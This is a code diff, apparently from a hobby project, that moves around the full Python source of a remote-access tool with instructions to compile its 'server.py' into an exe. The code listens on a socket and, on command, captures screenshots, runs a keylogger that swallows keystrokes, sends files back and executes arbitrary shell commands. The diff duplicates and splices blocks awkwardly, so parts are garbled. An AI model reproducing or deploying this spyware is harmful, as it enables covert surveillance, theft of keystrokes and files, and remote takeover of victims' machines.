@@ -28,135 +28,7 @@ from PIL import ImageGrab
 import keyboard
 
 # Server configuration
-HOST = '10.0.0.45'  # Replace with your ip adress from the server.py
-PORT = 5555
-
-# Create a socket
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((HOST, PORT))
-server.listen(5)
-
-print(f"Server listening on {HOST}:{PORT}")
-
-# Accept client connection
-client_socket, addr = server.accept()
-print(f"Connection from {addr}")
-
-# Keylogger file
-log_file = "keylog.txt"
-keylog_active = False
-keylog_thread = None
-
-def take_screenshot():
-    try:
-        screenshot = ImageGrab.grab()
-        screenshot.save("screenshot.png")
-        with open("screenshot.png", "rb") as f:
-            screenshot_data = f.read()
-        os.remove("screenshot.png")  # Clean up temporary file
-        return screenshot_data
-    except Exception as e:
-        return f"Error taking screenshot: {str(e)}".encode()
-
-def log_keystrokes():
-    global keylog_active
-    with open(log_file, "a") as f:
-        while keylog_active:
-            try:
-                event = keyboard.read_event(suppress=True)
-                if event.event_type == keyboard.KEY_DOWN:
-                    f.write(f"{event.name} at {time.ctime()}\n")
-                    f.flush()  # Ensure data is written immediately
-            except Exception as e:
-                with open(log_file, "a") as err_f:
-                    err_f.write(f"Keylog error: {str(e)}\n")
-                time.sleep(1)  # Prevent tight CPU loop on error
-
-# Main loop to receive commands
-while True:
-    try:
-        command = client_socket.recv(1024).decode('utf-8')
-        
-        if command == "exit":
-            if keylog_active:
-                keylog_active = False
-            client_socket.close()
-            server.close()
-            break
-        elif command == "screenshot":
-            screenshot_data = take_screenshot()
-            if isinstance(screenshot_data, bytes):
-                client_socket.send(str(len(screenshot_data)).encode('utf-8'))
-                time.sleep(0.1)
-                client_socket.sendall(screenshot_data)  # Use sendall for large data
-            else:
-                client_socket.send(screenshot_data)  # Error message if failed
-        elif command == "keylog_start":
-            if not keylog_active:
-                keylog_active = True
-                keylog_thread = threading.Thread(target=log_keystrokes)
-                keylog_thread.daemon = True
-                keylog_thread.start()
-                client_socket.send("Keylogging started".encode('utf-8'))
-            else:
-                client_socket.send("Keylogging already running".encode('utf-8'))
-        elif command == "keylog_stop":
-            if keylog_active:
-                keylog_active = False
-                if keylog_thread:
-                    keylog_thread.join(timeout=1)
-                if os.path.exists(log_file):
-                    with open(log_file, "r") as f:
-                        logs = f.read()
-                    client_socket.send(logs.encode('utf-8'))
-                else:
-                    client_socket.send("No logs found".encode('utf-8'))
-            else:
-                client_socket.send("Keylogging is not running".encode('utf-8'))
-        elif command.startswith("download"):
-            try:
-                _, filename = command.split(" ", 1)
-                if os.path.exists(filename):
-                    with open(filename, "rb") as f:
-                        file_data = f.read()
-                    client_socket.send(str(len(file_data)).encode('utf-8'))
-                    time.sleep(0.1)
-                    client_socket.sendall(file_data)  # Use sendall for reliability
-                else:
-                    client_socket.send("File not found".encode('utf-8'))
-            except Exception as e:
-                client_socket.send(f"Error downloading file: {str(e)}".encode('utf-8'))
-        else:
-            # Execute command and return output
-            try:
-                result = subprocess.getoutput(command)
-                client_socket.send(result.encode('utf-8'))
-            except Exception as e:
-                client_socket.send(f"Command execution failed: {str(e)}".encode('utf-8'))
-    except UnicodeDecodeError:
-        client_socket.send("Error: Invalid command encoding received".encode('utf-8'))
-    except ConnectionError:
-        print("Client disconnected")
-        break
-    except Exception as e:
-        client_socket.send(f"Error: {str(e)}".encode('utf-8'))
-
-
-
-
-
-and this is the server.py file script that you need to create to an exe file not the client.py in visual stduio code.
-
-import socket
-import os
-import subprocess
-import time
-import threading
-from PIL import ImageGrab
-import keyboard
-
-# Server configuration
-HOST = '10.0.0.15'  # Updated to match client's target IP adress
+HOST = '10.0.0.15'  # Updated to match client's target IP
 PORT = 5555
 
 # Create a socket
@@ -270,6 +142,132 @@ while True:
                 client_socket.send(f"File uploaded as uploaded_{filename}".encode('utf-8'))
             except Exception as e:
                 client_socket.send(f"Error uploading file: {str(e)}".encode('utf-8'))
+        else:
+            # Execute command and return output
+            try:
+                result = subprocess.getoutput(command)
+                client_socket.send(result.encode('utf-8'))
+            except Exception as e:
+                client_socket.send(f"Command execution failed: {str(e)}".encode('utf-8'))
+    except UnicodeDecodeError:
+        client_socket.send("Error: Invalid command encoding received".encode('utf-8'))
+    except ConnectionError:
+        print("Client disconnected")
+        break
+    except Exception as e:
+        client_socket.send(f"Error: {str(e)}".encode('utf-8'))
+
+
+
+and this is the server.py file script that you need to create to an exe file not the client.py in visual stduio code.
+
+import socket
+import os
+import subprocess
+import time
+import threading
+from PIL import ImageGrab
+import keyboard
+
+# Server configuration
+HOST = '10.0.0.45'  # Replace with your server's IP if needed
+PORT = 5555
+
+# Create a socket
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((HOST, PORT))
+server.listen(5)
+
+print(f"Server listening on {HOST}:{PORT}")
+
+# Accept client connection
+client_socket, addr = server.accept()
+print(f"Connection from {addr}")
+
+# Keylogger file
+log_file = "keylog.txt"
+keylog_active = False
+keylog_thread = None
+
+def take_screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        screenshot.save("screenshot.png")
+        with open("screenshot.png", "rb") as f:
+            screenshot_data = f.read()
+        os.remove("screenshot.png")  # Clean up temporary file
+        return screenshot_data
+    except Exception as e:
+        return f"Error taking screenshot: {str(e)}".encode()
+
+def log_keystrokes():
+    global keylog_active
+    with open(log_file, "a") as f:
+        while keylog_active:
+            try:
+                event = keyboard.read_event(suppress=True)
+                if event.event_type == keyboard.KEY_DOWN:
+                    f.write(f"{event.name} at {time.ctime()}\n")
+                    f.flush()  # Ensure data is written immediately
+            except Exception as e:
+                with open(log_file, "a") as err_f:
+                    err_f.write(f"Keylog error: {str(e)}\n")
+                time.sleep(1)  # Prevent tight CPU loop on error
+
+# Main loop to receive commands
+while True:
+    try:
+        command = client_socket.recv(1024).decode('utf-8')
+        
+        if command == "exit":
+            if keylog_active:
+                keylog_active = False
+            client_socket.close()
+            server.close()
+            break
+        elif command == "screenshot":
+            screenshot_data = take_screenshot()
+            if isinstance(screenshot_data, bytes):
+                client_socket.send(str(len(screenshot_data)).encode('utf-8'))
+                time.sleep(0.1)
+                client_socket.sendall(screenshot_data)  # Use sendall for large data
+            else:
+                client_socket.send(screenshot_data)  # Error message if failed
+        elif command == "keylog_start":
+            if not keylog_active:
+                keylog_active = True
+                keylog_thread = threading.Thread(target=log_keystrokes)
+                keylog_thread.daemon = True
+                keylog_thread.start()
+                client_socket.send("Keylogging started".encode('utf-8'))
+            else:
+                client_socket.send("Keylogging already running".encode('utf-8'))
+        elif command == "keylog_stop":
+            if keylog_active:
+                keylog_active = False
+                if keylog_thread:
+                    keylog_thread.join(timeout=1)
+                if os.path.exists(log_file):
+                    with open(log_file, "r") as f:
+                        logs = f.read()
+                    client_socket.send(logs.encode('utf-8'))
+                else:
+                    client_socket.send("No logs found".encode('utf-8'))
+            else:
+                client_socket.send("Keylogging is not running".encode('utf-8'))
+        elif command.startswith("download"):
+            try:
+                _, filename = command.split(" ", 1)
+                if os.path.exists(filename):
+                    with open(filename, "rb") as f:
+                        file_data = f.read()
+                    client_socket.send(str(len(file_data)).encode('utf-8'))
+                    time.sleep(0.1)
+                    client_socket.sendall(file_data)  # Use sendall for reliability
+                else:
+                    client_socket.send("File not found".encode('utf-8'))
+            except Exception as e:
+                client_socket.send(f"Error downloading file: {str(e)}".encode('utf-8'))
         else:
             # Execute command and return output
             try:
